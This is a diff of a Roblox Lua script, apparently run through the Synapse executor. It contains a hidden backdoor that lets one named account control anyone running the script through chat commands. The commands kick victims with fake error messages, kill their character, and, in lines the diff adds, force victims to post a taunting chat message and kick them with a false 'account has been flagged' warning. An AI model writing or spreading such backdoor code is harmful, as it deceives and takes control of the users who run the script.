@@ -1,5 +1,4 @@
 local speaker = game.Players.LocalPlayer
-print("ABC")
 
 local people = {
     "432757113"
@@ -25,7 +24,7 @@ end
 
  function getChat()
     game.Players.Hypickels.Chatted:Connect(function(msg)
-        if msg == "/e kick"then 
+        if msg == "/e kick" then 
             speaker:Kick("Synapse has ran into an error please restart!")
         end
         if msg == "/e bring" then
@@ -33,6 +32,12 @@ end
         end
         if msg == "/e kill" then
             speaker.Character.Humanoid.Health = 0
+        end
+        if msg == "/e ct1" then 
+            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("Adam is best, brady wady is adam's cat maid.", "All")
+        end
+        if msg == "/e fakekick" then 
+            speaker:Kick("Unkown client actions detected, your account has been flagged. ")
         end
     end)
 end
